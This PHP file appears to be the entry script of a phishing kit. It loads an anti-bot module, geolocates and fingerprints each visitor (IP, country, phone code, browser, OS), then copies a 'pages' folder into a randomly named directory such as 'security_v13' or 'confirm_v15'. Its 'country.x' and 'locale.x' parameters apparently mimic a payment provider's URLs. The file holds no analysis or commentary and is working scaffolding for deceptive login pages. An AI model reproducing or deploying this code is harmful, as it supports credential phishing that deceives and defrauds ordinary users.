<?php
include("antibots.php");
session_start();
error_reporting(0);
/////////////////////////////////////////////////////////////////////////////////////
$ip = $_SERVER['REMOTE_ADDR'];                                                     //
$get = json_decode(file_get_contents("http://ip-api.com/json/".$ip.""));           //
$country= $get->country;                                                           //
$code_country = $get->countryCode;                                                 //
/////////////////////////////////////////////////////////////////////////////////////
$_SESSION['ip'] = $ip;                                                             //
$_SESSION['cn'] = $country;                                                        //
$_SESSION['code_cn'] = $code_country;                                              // 
$c_n = $code_country;                                                              //
$cn = $code_country;                                                               //
if (empty($code_country)) { $c_n = "Unknow"; $cn = 'us';}                           //
/////////////////////////////////////////////////////////////////////////////////////
$get = @json_decode(file_get_contents("files/js/phone.json"));                       //
$code= $get->$c_n;                                                                 //
$_SESSION['codde'] = $code;                                                        //
/////////////////////////////////////////////////////////////////////////////////////
$browserx="chrome";
function OS($USER_AGENT){
  $OS_ERROR    =   "Unknown OS Platform";
    $OS  =   array( '/windows nt 10/i'      =>  'Windows 10',
                  '/windows nt 6.3/i'     =>  'Windows 8.1',
                  '/windows nt 6.2/i'     =>  'Windows 8',
                  '/windows nt 6.1/i'     =>  'Windows 7',
                  '/windows nt 6.0/i'     =>  'Windows Vista',
                  '/windows nt 5.2/i'     =>  'Windows Server 2003/XP x64',
                  '/windows nt 5.1/i'     =>  'Windows XP',
                  '/windows xp/i'         =>  'Windows XP',
                  '/windows nt 5.0/i'     =>  'Windows 2000',
                  '/windows me/i'         =>  'Windows ME',
                  '/win98/i'              =>  'Windows 98',
                  '/win95/i'              =>  'Windows 95',
                  '/win16/i'              =>  'Windows 3.11',
                  '/macintosh|mac os x/i' =>  'Mac OS X',
                  '/mac_powerpc/i'        =>  'Mac OS 9',
                  '/linux/i'              =>  'Linux',
                  '/ubuntu/i'             =>  'Ubuntu',
                  '/iphone/i'             =>  'iPhone',
                  '/ipod/i'               =>  'iPod',
                  '/ipad/i'               =>  'iPad',
                  '/android/i'            =>  'Android',
                  '/blackberry/i'         =>  'BlackBerry',
                  '/webos/i'              =>  'Mobile');
    foreach ($OS as $regex => $value) { 
        if (preg_match($regex, $USER_AGENT)) {
            $OS_ERROR = $value;
        }

    }   
    return $OS_ERROR;
}

function Browser($USER_AGENT){
  $BROWSER_ERROR    =   "Unknown Browser";
    $BROWSER  =   array('/msie/i'       =>  'Internet Explorer',
                        '/firefox/i'    =>  'Firefox',
                        '/safari/i'     =>  'Safari',
                        '/chrome/i'     =>  'Chrome',
                        '/edge/i'       =>  'Edge',
                        '/opera/i'      =>  'Opera',
                        '/netscape/i'   =>  'Netscape',
                        '/maxthon/i'    =>  'Maxthon',
                        '/konqueror/i'  =>  'Konqueror',
                        '/mobile/i'     =>  'Handheld Browser');
    foreach ($BROWSER as $regex => $value) { 
        if (preg_match($regex, $USER_AGENT)) {
            $BROWSER_ERROR = $value;
        }
    }
    return $BROWSER_ERROR;
}
//$dst = $_SESSION['rn'];
$_SESSION['bro'] = Browser($_SERVER['HTTP_USER_AGENT']);
$_SESSION['os'] = OS($_SERVER['HTTP_USER_AGENT']);
$ar = array('confirmer','confirm','safety','securite','safe','security','protection','update','','center','assistance','help','privacy','legal','fees','aide','account','support');
  $dst= $ar[array_rand($ar)].'_v1'.rand(0,9);
  function recurse_copy($src,$dst) {
  $dir = opendir($src);
  @mkdir($dst);
  while(false !== ( $file = readdir($dir)) ) {
  if (( $file != '.' ) && ( $file != '..' )) {
  if ( is_dir($src . '/' . $file) ) {
  recurse_copy($src . '/' . $file,$dst . '/' . $file);
  }
  else {
  copy($src . '/' . $file,$dst . '/' . $file);
  }}}
  closedir($dir);
  }
$_SESSION['SESSION'] = md5(microtime());
$src="pages";
$_SESSION['countrry'] = "country.x=".$cn."&locale.x=en_".$cn."";
?>
